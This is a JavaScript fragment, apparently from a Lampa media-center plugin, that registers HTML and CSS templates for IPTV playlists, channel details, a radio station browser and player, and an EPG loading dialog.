		Lampa.Template.add('mods_iptv_details', '<div class="mods_iptv-details"><div class="mods_epg-load" style="display:none;margin-bottom:-2em;position:relative"><div class="broadcast__text">' + Lampa.Lang.translate('search_searching') + '</div><div class="broadcast__scan"><div></div></div></div><div class="mods_iptv__program"></div></div>');
		Lampa.Template.add('mods_iptv_list', '<div class="iptv-list layer--height"><div class="iptv-list__ico"><svg height="36" viewBox="0 0 38 36" fill="none" xmlns="http://www.w3.org/2000/svg">        <rect x="2" y="8" width="34" height="21" rx="3" stroke="white" stroke-width="3"/>        <line x1="13.0925" y1=\"2.34874\" x2=\"16.3487\" y2=\"6.90754\" stroke=\"white\" stroke-width=\"3\" stroke-linecap=\"round\"/><line x1=\"1.5\" y1=\"-1.5\" x2=\"9.31665\" y2=\"-1.5\" transform=\"matrix(-0.757816 0.652468 0.652468 0.757816 26.197 2)\" stroke=\"white\" stroke-width=\"3\" stroke-linecap=\"round\"/>        <line x1=\"9.5\" y1=\"34.5\" x2=\"29.5\" y2=\"34.5\" stroke=\"white\" stroke-width=\"3\" stroke-linecap=\"round\"/></svg></div><div class=\"iptv-list__title\">#{iptv_select_playlist}</div><div class=\"iptv-list__items\"></div></div>');
		
		
      	Lampa.Template.add('modss_radio_content', '<div class="m-radio-content"><div class="m-radio-content__head"><div class="simple-button simple-button--invisible simple-button--filter selector button--stantion"><svg width="38" height="31" viewBox="0 0 38 31" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="17.613" width="3" height="16.3327" rx="1.5" transform="rotate(63.4707 17.613 0)" fill="currentColor"></rect><circle cx="13" cy="19" r="6" fill="currentColor"></circle><path fill-rule="evenodd" clip-rule="evenodd" d="M0 11C0 8.79086 1.79083 7 4 7H34C36.2091 7 38 8.79086 38 11V27C38 29.2091 36.2092 31 34 31H4C1.79083 31 0 29.2091 0 27V11ZM21 19C21 23.4183 17.4183 27 13 27C8.58173 27 5 23.4183 5 19C5 14.5817 8.58173 11 13 11C17.4183 11 21 14.5817 21 19ZM30.5 18C31.8807 18 33 16.8807 33 15.5C33 14.1193 31.8807 13 30.5 13C29.1193 13 28 14.1193 28 15.5C28 16.8807 29.1193 18 30.5 18Z" fill="currentColor"></path></svg><div class="hide"></div></div><div class="simple-button simple-button--invisible simple-button--filter selector button--catalog"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" xml:space="preserve"><path fill="currentColor" d="M478.354,146.286H33.646c-12.12,0-21.943,9.823-21.943,21.943v321.829c0,12.12,9.823,21.943,21.943,21.943h444.709c12.12,0,21.943-9.823,21.943-21.943V168.229C500.297,156.109,490.474,146.286,478.354,146.286z M456.411,468.114H55.589V190.171h400.823V468.114z"/><path fill="currentColor" d="M441.783,73.143H70.217c-12.12,0-21.943,9.823-21.943,21.943c0,12.12,9.823,21.943,21.943,21.943h371.566c12.12,0,21.943-9.823,21.943-21.943C463.726,82.966,453.903,73.143,441.783,73.143z"/><path fill="currentColor" d="M405.211,0H106.789c-12.12,0-21.943,9.823-21.943,21.943c0,12.12,9.823,21.943,21.943,21.943h298.423c12.12,0,21.943-9.823,21.943-21.943C427.154,9.823,417.331,0,405.211,0z"/></svg><div class="hide"></div></div><div class="simple-button simple-button--invisible simple-button--filter selector button--add"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" xml:space="preserve"><path d="M256 0C114.833 0 0 114.833 0 256s114.833 256 256 256 256-114.853 256-256S397.167 0 256 0zm0 472.341c-119.275 0-216.341-97.046-216.341-216.341S136.725 39.659 256 39.659 472.341 136.705 472.341 256 375.295 472.341 256 472.341z" fill="currentColor"></path><path d="M355.148 234.386H275.83v-79.318c0-10.946-8.864-19.83-19.83-19.83s-19.83 8.884-19.83 19.83v79.318h-79.318c-10.966 0-19.83 8.884-19.83 19.83s8.864 19.83 19.83 19.83h79.318v79.318c0 10.946 8.864 19.83 19.83 19.83s19.83-8.884 19.83-19.83v-79.318h79.318c10.966 0 19.83-8.884 19.83-19.83s-8.864-19.83-19.83-19.83z" fill="currentColor"></path></svg></div><div class="simple-button simple-button--invisible simple-button--filter selector button--search"><svg width="23" height="22" viewBox="0 0 23 22" fill="none" xmlns="http://www.w3.org/2000/svg" xml:space="preserve"><circle cx="9.9964" cy="9.63489" r="8.43556" stroke="currentColor" stroke-width="2.4"></circle><path d="M20.7768 20.4334L18.2135 17.8701" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"></path></svg><div class="hide"></div></div></div><div class="m-radio-content__body"><div class="m-radio-content__list"></div><div class="m-radio-content__cover"></div></div></div>');
		Lampa.Template.add('modss_radio_cover', '<div class="m-radio-cover"><div class="m-radio-cover__station"></div><div class="m-radio-cover__genre"></div><div class="m-radio-cover__img-container selector"><span class="m-radio-cover__before_statntion"></span><div class="m-radio-cover__img-box"><span class="arrow-up"></span><span class="arrow-down"></span><div class="m-radio-player__wave"></div><img src="https://www.radiorecord.ru/upload/iblock/507/close-up-image-fresh-spring-green-grass1.jpg"/></div><span class="m-radio-cover__after_statntion"></span></div><div class="m-radio-cover__album"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"m0 0h24v24h-24z\" fill=\"none\"/><path d=\"m12 2c5.52 0 10 4.48 10 10s-4.48 10-10 10-10-4.48-10-10 4.48-10 10-10zm0 14c2.213 0 4-1.787 4-4s-1.787-4-4-4-4 1.787-4 4 1.787 4 4 4zm0-5c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1z\" fill=\"#eee\"/></svg><span class="m-radio-cover__album_title"></span></div><div class="m-radio-cover__title"></div><div class="m-radio-cover__tooltip"></div><div class="m-radio-cover__playlist"></div></div>');
		Lampa.Template.add('modss_radio_list_item', '<div class="m-radio-item selector layer--visible"><div class="m-radio-item__num"></div><div class="m-radio-item__cover"><div class="m-radio-item__cover-box"><div class="m-radio-item__listeners"><svg fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="#292d32"><path d="m13.1807 11.8606c-.4 0-.76-.22-.93-.58l-1.45-2.89002-.42.78c-.23.43-.69.7-1.18.7h-.73c-.41 0-.75-.34-.75-.75s.34-.75.75-.75h.64l.79-1.46c.19-.34.57-.57.93-.55.39 0 .74.23.92.57l1.43 2.86.34-.69c.23-.46.68-.74 1.2-.74h.81c.41 0 .75.34.75.75s-.34.75-.75.75h-.71l-.71 1.41002c-.18.37-.53.59-.93.59z"></path><path d="m2.74982 18.6508c-.41 0-.75-.34-.75-.75v-5.7c-.05-2.71002.96-5.27002 2.84-7.19002 1.88-1.91 4.4-2.96 7.10998-2.96 5.54 0 10.05 4.51 10.05 10.05002v5.7c0 .41-.34.75-.75.75s-.75-.34-.75-.75v-5.7c0-4.71002-3.83-8.55002-8.55-8.55002-2.30998 0-4.44998.89-6.03998 2.51-1.6 1.63-2.45 3.8-2.41 6.12002v5.71c0 .42-.33.76-.75.76z"></path><path d="m5.94 12.4492h-.13c-2.1 0-3.81 1.71-3.81 3.81v1.88c0 2.1 1.71 3.81 3.81 3.81h.13c2.1 0 3.81-1.71 3.81-3.81v-1.88c0-2.1-1.71-3.81-3.81-3.81z"></path><path d="m18.19 12.4492h-.13c-2.1 0-3.81 1.71-3.81 3.81v1.88c0 2.1 1.71 3.81 3.81 3.81h.13c2.1 0 3.81-1.71 3.81-3.81v-1.88c0-2.1-1.71-3.81-3.81-3.81z"></path></g></svg><span class="m-radio-item__listeners-count"></span></div><img/></div></div><div class="m-radio-item__body"><div class="m-radio-item__title"></div><div class="m-radio-item__tooltip"></div></div><div class="m-radio-item__icons"><div class="m-radio-item__icon-favorite"><svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.534 477.534" xml:space="preserve"><path fill="currentColor" d="M438.482,58.61c-24.7-26.549-59.311-41.655-95.573-41.711c-36.291,0.042-70.938,15.14-95.676,41.694l-8.431,8.909l-8.431-8.909C181.284,5.762,98.662,2.728,45.832,51.815c-2.341,2.176-4.602,4.436-6.778,6.778c-52.072,56.166-52.072,142.968,0,199.134l187.358,197.581c6.482,6.843,17.284,7.136,24.127,0.654c0.224-0.212,0.442-0.43,0.654-0.654l187.29-197.581C490.551,201.567,490.551,114.77,438.482,58.61z M413.787,234.226h-0.017L238.802,418.768L63.818,234.226c-39.78-42.916-39.78-109.233,0-152.149c36.125-39.154,97.152-41.609,136.306-5.484c1.901,1.754,3.73,3.583,5.484,5.484l20.804,21.948c6.856,6.812,17.925,6.812,24.781,0l20.804-21.931c36.125-39.154,97.152-41.609,136.306-5.484c1.901,1.754,3.73,3.583,5.484,5.484C453.913,125.078,454.207,191.516,413.787,234.226z"/></svg></div><div class="m-radio-item__icon-play"><svg width="22" height="25" viewBox="0 0 22 25" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 10.7679C22.3333 11.5377 22.3333 13.4622 21 14.232L3.75 24.1913C2.41666 24.9611 0.75 23.9989 0.75 22.4593L0.750001 2.5407C0.750001 1.0011 2.41667 0.0388526 3.75 0.808653L21 10.7679Z" fill="currentColor"/></svg></div></div></div>');				
		Lampa.Template.add('modss_radio_player', '<div class="m-radio-player"><canvas class="player-canvas" id="player-canvas"></canvas><div><div class="m-radio-player__cover"></div></div><div class="m-radio-player__close"><svg viewBox="0 0 329.269 329"xml:space=preserve xmlns=http://www.w3.org/2000/svg><path d="M194.8 164.77 323.013 36.555c8.343-8.34 8.343-21.825 0-30.164-8.34-8.34-21.825-8.34-30.164 0L164.633 134.605 36.422 6.391c-8.344-8.34-21.824-8.34-30.164 0-8.344 8.34-8.344 21.824 0 30.164l128.21 128.215L6.259 292.984c-8.344 8.34-8.344 21.825 0 30.164a21.266 21.266 0 0 0 15.082 6.25c5.46 0 10.922-2.09 15.082-6.25l128.21-128.214 128.216 128.214a21.273 21.273 0 0 0 15.082 6.25c5.46 0 10.922-2.09 15.082-6.25 8.343-8.34 8.343-21.824 0-30.164zm0 0"fill=currentColor></path></svg></div></div>');
		Lampa.Template.add('modss_radio_play_player', '<div class="selector m_fm-player loading stop hide"><div class="m_fm-player__name">ModssFM</div><div id="fmplay_player_button" class="m_fm-player__button"><i></i><i></i><i></i><i></i></div></div>');
		Lampa.Template.add('radio_style_modss','<style>.m-radio-player>.player-canvas{display:block;position:absolute;left:0;top:0;width:100%;height:100%}@media only screen and (min-width:800px){.m-radio-player>.player-canvas{left:-8em}}@media only screen and (min-width:1300px){.m-radio-player>.player-canvas{left:-7em}}.m-radio-item__listeners{position:absolute;top:.5em;left:.5em;z-index:1;background-color:#eee;padding:.1em .3em;font-size:.7em;font-weight:700;color:#292d32;-webkit-border-radius:.25em;-moz-border-radius:.25em;border-radius:.25em}.m-radio-item__listeners>svg{width:1em;height:1em;vertical-align:bottom}.m-radio-cover__after_statntion,.m-radio-cover__before_statntion{display:none;position:relative;bottom:1.6em;font-size:1.2em;background-color:rgb(0,0,0,1);-webkit-border-radius:.3em;-moz-border-radius:.3em;border-radius:.3em;padding:.2em .5em;z-index:2;}.m-radio-cover__before_statntion{position:relative;top:1.7em;bottom:0;}.ambience--enable .m-radio-cover__img-container.focus .m-radio-cover__after_statntion,.ambience--enable .m-radio-cover__img-container.focus .m-radio-cover__before_statntion{display:inline}.m-radio-cover__img-container.focus .m-radio-cover__img-box{position:relative}.explorer-card__head-img.focus .arrow-down, .m-radio-cover__img-container.focus .m-radio-cover__img-box .arrow-down,.m-radio-cover__img-container.focus .m-radio-cover__img-box .arrow-up{position:absolute;z-index:3;width:2em;height:2em;left:46%} .explorer-card__head-img.focus .arrow-down {bottom: -2em !important; left: 40%}.m-radio-cover__img-container.focus .m-radio-cover__img-box .arrow-up{top:2em;border-left:.3em solid #fff;border-top:.3em solid #fff;-webkit-animation:bounceUp 1s infinite;animation:bounceUp 1s infinite}.explorer-card__head-img.focus .arrow-down, .m-radio-cover__img-container.focus .m-radio-cover__img-box .arrow-down{bottom:2em;border-right:.3em solid #fff;border-bottom:.3em solid #fff;-webkit-animation:bounceDown 1s infinite;animation:bounceDown 1s infinite} .m-radio-cover__img-container.focus .arrow{display:block}@-webkit-keyframes bounceUp{0%{-webkit-transform:translateY(0) rotate(45deg);transform:translateY(0) rotate(45deg)}50%{-webkit-transform:translateY(10px) rotate(45deg);transform:translateY(10px) rotate(45deg)}100%{-webkit-transform:translateY(0) rotate(45deg);transform:translateY(0) rotate(45deg)}}@keyframes bounceUp{0%{-webkit-transform:translateY(0) rotate(45deg);transform:translateY(0) rotate(45deg)}50%{-webkit-transform:translateY(10px) rotate(45deg);transform:translateY(10px) rotate(45deg)}100%{-webkit-transform:translateY(0) rotate(45deg);transform:translateY(0) rotate(45deg)}}@-webkit-keyframes bounceDown{0%{-webkit-transform:translateY(0) rotate(45deg);transform:translateY(0) rotate(45deg)}50%{-webkit-transform:translateY(-10px) rotate(45deg);transform:translateY(-10px) rotate(45deg)}100%{-webkit-transform:translateY(0) rotate(45deg);transform:translateY(0) rotate(45deg)}}@keyframes bounceDown{0%{-webkit-transform:translateY(0) rotate(45deg);transform:translateY(0) rotate(45deg)}50%{-webkit-transform:translateY(-10px) rotate(45deg);transform:translateY(-10px) rotate(45deg)}100%{-webkit-transform:translateY(0) rotate(45deg);transform:translateY(0) rotate(45deg)}}.m_fm-player{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;-webkit-border-radius:.3em;-moz-border-radius:.3em;border-radius:.3em;padding:.2em .4em;margin-left:.5em;margin-right:.5em}.m_fm-player__name{margin-right:.35em;white-space:nowrap;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;max-width:8em;display:none}.m_fm-player__button{position:relative;width:2em;height:2em;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-border-radius:.3em;-moz-border-radius:.3em;border-radius:.3em;border:.15em solid rgba(255,255,255,1)}.m_fm-player__button>*{opacity:.75}.m_fm-player__button i{display:block;width:.2em;background-color:#fff;margin:0 .1em;-webkit-animation:sound 0s -.8s linear infinite alternate;-moz-animation:sound 0s -.8s linear infinite alternate;-o-animation:sound 0s -.8s linear infinite alternate;animation:sound 0s -.8s linear infinite alternate;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.m_fm-player__button i:nth-child(1){-webkit-animation-duration:474ms;-moz-animation-duration:474ms;-o-animation-duration:474ms;animation-duration:474ms}.m_fm-player__button i:nth-child(2){-webkit-animation-duration:433ms;-moz-animation-duration:433ms;-o-animation-duration:433ms;animation-duration:433ms}.m_fm-player__button i:nth-child(3){-webkit-animation-duration:407ms;-moz-animation-duration:407ms;-o-animation-duration:407ms;animation-duration:407ms}.m_fm-player__button i:nth-child(4){-webkit-animation-duration:458ms;-moz-animation-duration:458ms;-o-animation-duration:458ms;animation-duration:458ms}.m_fm-player.stop .m_fm-player__button i{display:none}.m_fm-player.stop .m_fm-player__button:after{content:\"\";width:.5em;height:.5em;background-color:rgba(255,255,255,1)}.m_fm-player.loading .m_fm-player__button:before{content:\"\";display:block;border-top:.2em solid rgba(255,255,255,.9);border-left:.2em solid transparent;border-right:.2em solid transparent;border-bottom:.2em solid transparent;-webkit-animation:sound-loading 1s linear infinite;-moz-animation:sound-loading 1s linear infinite;-o-animation:sound-loading 1s linear infinite;animation:sound-loading 1s linear infinite;width:.9em;height:.9em;-webkit-border-radius:100%;-moz-border-radius:100%;border-radius:100%;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.m_fm-player.loading .m_fm-player__button i{display:none}.m_fm-player.focus{background-color:#fff;color:#000}.m_fm-player.focus .m_fm-player__name{display:inline}@media screen and (max-width:580px){.m_fm-player.focus .m_fm-player__name{display:none}}@media screen and (max-width:385px){.m_fm-player.focus .m_fm-player__name{display:none}}.m_fm-player.focus .m_fm-player__button{border-color:#000}.m_fm-player.focus .m_fm-player__button i,.m_fm-player.focus .m_fm-player__button:after,.m_fm-player.focus.stop .m_fm-player__button:before{background-color:#000}.m_fm-player.focus .m_fm-player__button:before{border-top-color:#000}.m-radio-content{padding:0 1.5em}.m-radio-content__head{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;padding:1.5em 0}.m-radio-content__body{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex}.m-radio-content__list{width:60%}@media screen and (max-width:576px){.m-radio-content__list{width:100%}}.m-radio-content__cover{width:40%;padding:0 2em}@media screen and (max-width:576px){.m-radio-content__cover{display:none}}.m-radio-cover{text-align:center;line-height:1.4}.m-radio-cover__img-container{max-width:20em;margin:0 auto}.m-radio-cover__img-container.focus .m-radio-cover__img-box::after{content:"";position:absolute;top:-.5em;left:-.5em;right:-.5em;bottom:-.5em;border:.3em solid #fff;-webkit-border-radius:1.4em;border-radius:1.4em;z-index:-1;pointer-events:none}.m-radio-cover__img-box{position:relative;padding-bottom:100%;background-color:rgba(0,0,0,.3);-webkit-border-radius:1em;border-radius:1em}.m-radio-cover__img-box>img{position:absolute;top:0;left:0;width:100%;height:100%;-webkit-border-radius:1em;border-radius:1em;opacity:0}.m-radio-cover__img-box.loaded1{background-color:transparent}.m-radio-cover__img-box.loaded>img{opacity:1}.m-radio-cover__img-box.loaded-icon{background-color:rgba(0,0,0,.3)}.m-radio-cover__img-box.loaded-icon>img{left:20%;top:20%;width:60%;height:60%;opacity:.2}.m-radio-cover__title{font-weight:700;font-size:1.5em;margin-top:1em}.m-radio-cover__tooltip{font-weight:300;font-size:1.3em;margin-top:.2em}.m-radio-cover__station{font-weight:500;font-size:3.3em;margin-bottom:.2em}.m-radio-cover__genre{font-weight:200;font-size:1em;margin-bottom:.6em}.m-radio-cover__album{font-weight:300;font-size:1em;margin-top:.4em}.m-radio-cover__album>svg{width:0;height:1.25em;margin-right:.2em;vertical-align:text-bottom}.m-radio-item{padding:1em;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center}.m-radio-item.play,.m-radio-item.stop{-webkit-border-radius:1em;border-radius:1em;background-color:rgba(0,0,0,.3);border:.15em solid rgba(255,255,255,1)}.m-radio-item.focused{-webkit-border-radius:1em;border-radius:1em;background-color:rgba(0,0,0,.3);border:.15em solid rgba(255,255,255,1)}.m-radio-item.play .m-radio-item__icon-play{display:block;-webkit-animation:sound-loading 1s linear infinite;-moz-animation:sound-loading 1s linear infinite;-o-animation:sound-loading 1s linear infinite;animation:sound-loading 2s linear infinite}.m-radio-item__num{font-weight:700;margin-right:1em;font-size:1.3em;opacity:.4;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}@media screen and (max-width:400px){.m-radio-item__num{display:none}}.m-radio-item__body{max-width:60%}.m-radio-item__cover{width:5em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;margin-right:2em}.m-radio-item__cover-box{position:relative;padding-bottom:100%;background-color:rgba(0,0,0,.3);-webkit-border-radius:1em;border-radius:1em}.m-radio-item__cover-box>img{position:absolute;top:0;left:0;width:100%;height:100%;-webkit-border-radius:1em;border-radius:1em;opacity:0}.m-radio-item__cover-box.loaded{background-color:transparent}.m-radio-item__cover-box.loaded>img{opacity:1}.m-radio-item__cover-box.loaded-icon{background-color:rgba(0,0,0,.3)}.m-radio-item__cover-box.loaded-icon>img{left:20%;top:20%;width:60%;height:60%;opacity:.2}.m-radio-item__title{font-weight:700;font-size:1.2em}.m-radio-item__tooltip{opacity:.5;margin-top:.5em;font-size:1.1em}.m-radio-item__icons{margin-left:auto;padding-left:1em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex}.m-radio-item__icons svg{width:1.4em!important;height:1.4em!important}.m-radio-item__icons>*+*{margin-left:1.5em}.m-radio-item__icons .m-radio-item__icon-favorite{display:none}.m-radio-item__icons .m-radio-item__icon-play{display:none}.m-radio-item.focus{background:#fff;color:#000;-webkit-border-radius:1em;border-radius:1em}.m-radio-item.focus .m-radio-item__icon-play,.m-radio-item.stop .m-radio-item__icon-play{display:block}.m-radio-item.favorite .m-radio-item__icon-favorite{display:block}.m-radio-item.empty--item .m-radio-item__num,.m-radio-item.empty--item .m-radio-item__title,.m-radio-item.empty--item .m-radio-item__tooltip{background-color:rgba(255,255,255,.3);height:1.2em;-webkit-border-radius:.3em;border-radius:.3em}.m-radio-item.empty--item .m-radio-item__num{width:1.4em}.m-radio-item.empty--item .m-radio-item__title{width:7em}.m-radio-item.empty--item .m-radio-item__tooltip{width:16em}.m-radio-item.empty--item .m-radio-item__icons{display:none}.m-radio-item.empty--item .m-radio-item__cover-box{background-color:rgba(255,255,255,.3)}.m-radio-item.empty--item.focus{background-color:transparent;color:#fff}.m-radio-player{position:fixed;z-index:100;left:0;top:0;width:100%;height:100%;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center}.m-radio-player__cover{width:30em}.m-radio-player__wave{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;margin-top:2em}.m-radio-cover__img-box .m-radio-player__wave{position:absolute;top:37%;left:20%;z-index:1}.m-radio-player__wave>div{width:2px;background-color:#fff;margin:0 .3em;height:1em;opacity:0}.m-radio-player__wave>div.loading{-webkit-animation:radioAnimationWaveLoading .4s ease infinite;-o-animation:radioAnimationWaveLoading .4s ease infinite;animation:radioAnimationWaveLoading .4s ease infinite}.m-radio-player__wave>div.play{-webkit-animation:radioAnimationWavePlay 50ms linear infinite alternate;-o-animation:radioAnimationWavePlay 50ms linear infinite alternate;animation:radioAnimationWavePlay 50ms linear infinite alternate}.m-radio-player__close{position:fixed;top:1.5em;right:50%;margin-right:-2em;-webkit-border-radius:100%;border-radius:100%;padding:1em;display:none;background-color:rgba(255,255,255,.1)}.m-radio-player__close>svg{width:1.5em;height:1.5em}body.true--mobile .m-radio-player__close{display:block}@-webkit-keyframes radioAnimationWaveLoading{0%{-webkit-transform:scale3d(1,.3,1);transform:scale3d(1,.3,1);opacity:1}10%{-webkit-transform:scale3d(1,1.5,1);transform:scale3d(1,1.5,1);opacity:1}20%{-webkit-transform:scale3d(1,.3,1);transform:scale3d(1,.3,1);opacity:1}100%{-webkit-transform:scale3d(1,.3,1);transform:scale3d(1,.3,1);opacity:1}}@-o-keyframes radioAnimationWaveLoading{0%{transform:scale3d(1,.3,1);opacity:1}10%{transform:scale3d(1,1.5,1);opacity:1}20%{transform:scale3d(1,.3,1);opacity:1}100%{transform:scale3d(1,.3,1);opacity:1}}@keyframes radioAnimationWaveLoading{0%{-webkit-transform:scale3d(1,.3,1);transform:scale3d(1,.3,1);opacity:1}10%{-webkit-transform:scale3d(1,1.5,1);transform:scale3d(1,1.5,1);opacity:1}20%{-webkit-transform:scale3d(1,.3,1);transform:scale3d(1,.3,1);opacity:1}100%{-webkit-transform:scale3d(1,.3,1);transform:scale3d(1,.3,1);opacity:1}}@-webkit-keyframes radioAnimationWavePlay{0%{-webkit-transform:scale3d(1,.3,1);transform:scale3d(1,.3,1);opacity:.3}100%{-webkit-transform:scale3d(1,2,1);transform:scale3d(1,2,1);opacity:1}}@-o-keyframes radioAnimationWavePlay{0%{transform:scale3d(1,.3,1);opacity:.3}100%{transform:scale3d(1,2,1);opacity:1}}@keyframes radioAnimationWavePlay{0%{-webkit-transform:scale3d(1,.3,1);transform:scale3d(1,.3,1);opacity:.3}100%{-webkit-transform:scale3d(1,2,1);transform:scale3d(1,2,1);opacity:1}}@-webkit-keyframes sound{0%{height:.1em}100%{height:1em}}@-moz-keyframes sound{0%{height:.1em}100%{height:1em}}@-o-keyframes sound{0%{height:.1em}100%{height:1em}}@keyframes sound{0%{height:.1em}100%{height:1em}}@-webkit-keyframes sound-loading{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@-moz-keyframes sound-loading{0%{-moz-transform:rotate(0);transform:rotate(0)}100%{-moz-transform:rotate(360deg);transform:rotate(360deg)}}@-o-keyframes sound-loading{0%{-o-transform:rotate(0);transform:rotate(0)}100%{-o-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes sound-loading{0%{-webkit-transform:rotate(0);-moz-transform:rotate(0);-o-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}</style>');
		
		
		Lampa.Template.add('modss_iptv_content', "\n        <div class=\"mds-iptv-modss iptv-content\">\n            <div class=\"iptv-content__menu\"></div>\n            <div class=\"iptv-content__channels\"></div>\n            <div class=\"iptv-content__details\"></div>\n        </div>\n    ");
		Lampa.Template.add('modss_iptv_menu', "\n        <div class=\"iptv-menu\">\n            <div class=\"iptv-menu__body\">\n                <div class=\"iptv-menu__head\">\n                    <div class=\"iptv-menu__title\"></div>\n                    <div class=\"iptv-menu__search selector\">\n                        <svg width=\"23\" height=\"22\" viewBox=\"0 0 23 22\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n                            <circle cx=\"9.9964\" cy=\"9.63489\" r=\"8.43556\" stroke=\"currentColor\" stroke-width=\"2.4\"></circle>\n                            <path d=\"M20.7768 20.4334L18.2135 17.8701\" stroke=\"currentColor\" stroke-width=\"2.5\" stroke-linecap=\"round\"></path>\n                        </svg>\n                    </div>\n                </div>\n                <div class=\"iptv-menu__list\"></div>\n            </div>\n        </div>\n    ");
		Lampa.Template.add('iptv_menu_mobile_button_search', "\n        <div class=\"iptv-menu__search-mobile selector\">\n            <svg width=\"23\" height=\"22\" viewBox=\"0 0 23 22\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n                <circle cx=\"9.9964\" cy=\"9.63489\" r=\"8.43556\" stroke=\"currentColor\" stroke-width=\"2.4\"></circle>\n                <path d=\"M20.7768 20.4334L18.2135 17.8701\" stroke=\"currentColor\" stroke-width=\"2.5\" stroke-linecap=\"round\"></path>\n            </svg>\n        </div>\n    ");
		Lampa.Template.add('modss_iptv_channels', "\n        <div class=\"iptv-channels\">\n            \n        </div>\n    ");
		Lampa.Template.add('modss_iptv_details', "\n        <div class=\"iptv-details layer--wheight\">\n            <div class=\"iptv-details__play\"></div>\n            <div class=\"iptv-details__title\"></div>\n\n            <div class=\"iptv-details__program\">\n\n            </div>\n        </div>\n    ");
		Lampa.Template.add('modss_iptv_details_empty', "\n        <div class=\"iptv-details-epmty endless endless-up\">\n            <div><span></span><span style=\"width: 60%\"></span></div>\n            <div><span></span><span style=\"width: 70%\"></span></div>\n            <div><span></span><span style=\"width: 40%\"></span></div>\n            <div><span></span><span style=\"width: 55%\"></span></div>\n            <div><span></span><span style=\"width: 30%\"></span></div>\n            <div><span></span><span style=\"width: 55%\"></span></div>\n            <div><span></span><span style=\"width: 30%\"></span></div>\n        </div>\n    ");
		Lampa.Template.add('modss_iptv_playlist_item', "\n        <div class=\"iptv-playlist-item selector layer--visible layer--render\">\n            <div class=\"iptv-playlist-item__body\">\n                <div class=\"iptv-playlist-item__name\">\n                    <div class=\"iptv-playlist-item__name-ico\"><span></span></div>\n                    <span class=\"iptv-playlist-item__epg-badge hide\" title=\"#{iptv_playlist_has_epg}\">EPG</span>\n                    <div class=\"iptv-playlist-item__name-text\">est</div>\n                </div>\n                <div class=\"iptv-playlist-item__url\"></div>\n            </div>\n\n            <div class=\"iptv-playlist-item__footer hide\">\n                <div class=\"iptv-playlist-item__details details-left\"></div>\n                <div class=\"iptv-playlist-item__details details-right\"></div>\n            </div>\n        </div>\n    ");
		Lampa.Template.add('modss_playlist_epg_modal', "\n        <div class=\"playlist-epg-modal\">\n            <div class=\"playlist-epg-modal__parsing\">\n                <div class=\"playlist-epg-modal__checkpoints\">\n                    <div class=\"playlist-epg-modal__checkpoint\" data-step=\"load\">\n                        <span class=\"playlist-epg-modal__checkpoint-dot\"></span>\n                        <span class=\"playlist-epg-modal__checkpoint-text\">#{iptv_epg_checkpoint_load}</span>\n                    </div>\n                    <div class=\"playlist-epg-modal__checkpoint\" data-step=\"parse\">\n                        <span class=\"playlist-epg-modal__checkpoint-dot\"></span>\n                        <span class=\"playlist-epg-modal__checkpoint-text\">#{iptv_epg_checkpoint_parse}</span>\n                    </div>\n                    <div class=\"playlist-epg-modal__checkpoint\" data-step=\"save\">\n                        <span class=\"playlist-epg-modal__checkpoint-dot\"></span>\n                        <span class=\"playlist-epg-modal__checkpoint-text\">#{iptv_epg_checkpoint_save}</span>\n                    </div>\n                </div>\n                <div class=\"playlist-epg-modal__progress-wrap\">\n                    <div class=\"playlist-epg-modal__progress-bar\">\n                        <div class=\"playlist-epg-modal__progress-fill\"></div>\n                    </div>\n                    <div class=\"playlist-epg-modal__percent\">0%</div>\n                </div>\n            </div>\n            <div class=\"settings-param update-guide-status playlist-epg-modal__result hide\" data-static=\"true\">\n                <div class=\"settings-param__name\">#{iptv_guide_status_finish}</div>\n                <div class=\"settings-param__value\">#{iptv_guide_status_noupdates}</div>\n            </div>\n        </div>\n    ");
